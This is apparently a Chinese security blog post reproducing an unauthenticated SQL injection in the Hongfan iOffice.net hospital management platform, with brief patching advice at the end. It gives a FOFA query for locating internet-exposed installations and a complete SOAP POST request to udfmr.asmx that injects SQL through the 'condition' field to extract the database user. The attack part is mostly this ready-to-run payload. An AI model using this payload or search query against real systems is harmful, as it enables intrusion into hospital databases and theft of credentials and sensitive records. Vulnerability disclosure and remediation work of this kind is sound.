#  【Web渗透】SQL注入漏洞复现   
Whoami  晨曦安全团队   2023-11-25 23:59  
  
### 0x01 产品简介  
  
  红帆iOffice  
.net  
从最早满足医院行政办公需求（传统OA），到目前融合了卫生主管部门的管理规范和众多行业特色应用，是目前唯一定位于解决医院综合业务管理的软件，是最符合医院行业特点的医院综合业务管理平台，是成功案例最多的医院综合业务管理软件。  
### 0x02 漏洞概述  
  
 红帆iOffice.net udfmr.asmx接口处存在  
SQL注入漏洞  
，未经身份认证的攻击者可通过该漏洞获取数据库敏感信息及凭证，最终可能导致服务器失陷。  
### 0x03 复现环境  
  
FOFA：app="红帆-ioffice"  
  
![](https://mmbiz.qpic.cn/mmbiz_png/42JicKqUklyiaaKUK5DRNYDiayj5Ab7Pwj9RJfCkgcqKqYUSeK1lMCbGfpKOrlfiaHStpIqggISGDnGgnNJf5TQXxA/640?wx_fmt=png&from=appmsg "")  
###  0x04 漏洞复现  
```
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/42JicKqUklyiaaKUK5DRNYDiayj5Ab7Pwj9mROiaCx52ZyzzlxqX72ro6y1yL7HMviasibXAeDwPiaKk0IOVQExjUjrPg/640?wx_fmt=png&from=appmsg "")  
  
 出现以上这种情况则可能存在漏洞  
  
PoC  
```
```  
```
POST /iOffice/prg/set/wss/udfmr.asmx HTTP/1.1



Host: your-ip



Content-Type: text/xml; charset=utf-8



SOAPAction: "http://tempuri.org/ioffice/udfmr/GetEmpSearch"



 



<?xml version="1.0" encoding="utf-8"?>



<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">



  <soap:Body>



    <GetEmpSearch xmlns="http://tempuri.org/ioffice/udfmr">



      <condition>1=user_name()</condition>



    </GetEmpSearch>



  </soap:Body>



</soap:Envelope>
```  
```
```  
  
查询当前数据库用户  
  
![](https://mmbiz.qpic.cn/mmbiz_png/42JicKqUklyiaaKUK5DRNYDiayj5Ab7Pwj9nH5icqW3gIN7k8WL4pr5icmWRJxxPnLVI0LsZ91zJxWbcdicX95mqCDyQ/640?wx_fmt=png&from=appmsg "")  
###  0x05 修复建议  
  
 限制访问来源地址，如非必要，不要将系统开放在互联网上。  
  
 升级至安全版本或打补丁。  
```
文章来源于互联网，只做学习交流，如有侵权请联系删除！原文链接：https://blog.csdn.net/qq_41904294/article/details/132365842
```  
  
  
